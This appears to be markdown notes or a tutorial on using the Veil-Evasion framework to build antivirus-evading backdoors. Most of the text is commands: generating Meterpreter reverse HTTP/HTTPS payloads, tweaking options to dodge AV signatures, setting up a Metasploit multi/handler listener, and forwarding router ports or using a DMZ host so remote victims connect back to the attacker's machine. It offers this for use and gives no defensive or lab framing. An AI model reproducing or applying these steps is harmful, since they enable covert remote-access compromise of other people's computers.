# VEIL

Veil is a framework for generating __undetectable__ backdoors.

```
apt-get install veil
```

## Creating demo payload

```
veil
> list > Evasion
# VEIL-EVASION
list (see payloads)
> go/meterpreter/rev_https.py (example)
```

You can validate payload detection through _NoDistribute_ utility.

### Reverse connection example

```
# VEIL-EVASION
> list > go/meterpreter/rev_https.py
set LHOST <Metasploit handler>
set LPORT <Metasploit port>
generate
```

It is a good idea to set up different payload options to make it look a little bit different to common AV's signatures.

After generating the file, we need to set our _Metasploit handler_.

```
msfconsole
use exploit/multi/handler
# configuration should correspond to the payload used in the backdoor
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <host ip>
set LPORT <desired port>
```

## Listening for connections with Metasploit

```
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
```

## External network exploit

```
# VEIL-EVASION
use cs/meterpreter/rev_http
SET LPORT 8080
SET LHOST <REAL_IP> # we do not want to use LAN IP, look for real network ip
generate
```

Remember to run `msfconsole` and proper configure _Metasploit handler_'s `PAYLOAD`.

### Configure Router to forward connections to Kali

Access router configuration panel and look for __IP Forwarding__ configuration.

We'll forward connections that come through our selected port (in our example, port `8080`) to the LAN IP of our kali machine (get it with `ifconfig`).

If you plan to host your payload using a web server such as apache from your own machine, you'd probably want to forward requests comming through port `80` too.

An alternative, if your router supports it, is to set your host as __DMZ Host__, so that router forwards all requests to your machine.
 